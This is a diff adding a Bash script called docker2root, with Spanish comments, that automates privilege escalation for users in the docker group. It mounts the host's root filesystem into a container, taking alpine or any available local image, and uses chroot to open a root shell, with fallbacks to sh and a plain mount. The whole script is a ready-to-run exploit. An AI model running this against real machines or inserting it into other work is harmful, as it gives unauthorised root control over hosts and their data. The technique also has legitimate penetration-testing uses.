@@ -1,0 +1,53 @@
+#!/bin/bash
+# =========================================================
+# docker2root
+# Autor: Carlos Martín
+# =========================================================
+#
+# Descripción:
+# -------------
+# Herramienta de automatización para escalada de privilegios
+# mediante Docker.
+#
+# Uso:
+# ----
+#
+# chmod +x docker2root.sh
+# ./docker2root.sh
+#
+echo "[+] Comprobando grupo docker..."
+id | grep -q docker || {
+  echo "[-] El usuario actual no pertenece al grupo docker."
+  exit 1
+}
+
+echo "[+] Comprobando conexión a Internet..."
+if ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then
+  INTERNET=1
+  echo "[+] Hay Internet. Usando alpine."
+  IMAGE="alpine"
+else
+  INTERNET=0
+  echo "[!] No hay Internet. Buscando imagen local..."
+  IMAGE=$(docker images --format "{{.Repository}}:{{.Tag}}" | head -n 1)
+
+  if [ -z "$IMAGE" ]; then
+    echo "[-] No hay Internet ni imágenes locales disponibles."
+    exit 1
+  fi
+
+  echo "[+] Usando imagen local: $IMAGE"
+fi
+
+echo "[+] Intentando shell root con bash..."
+docker run -it --rm -v /:/mnt "$IMAGE" chroot /mnt /bin/bash 2>/dev/null
+
+if [ $? -ne 0 ]; then
+  echo "[!] bash falló. Probando sh..."
+  docker run -it --rm -v /:/mnt "$IMAGE" chroot /mnt /bin/sh 2>/dev/null
+fi
+
+if [ $? -ne 0 ]; then
+  echo "[!] chroot falló. Abriendo shell con el host montado en /mnt..."
+  docker run -it --rm -v /:/mnt "$IMAGE" /bin/sh
+fi
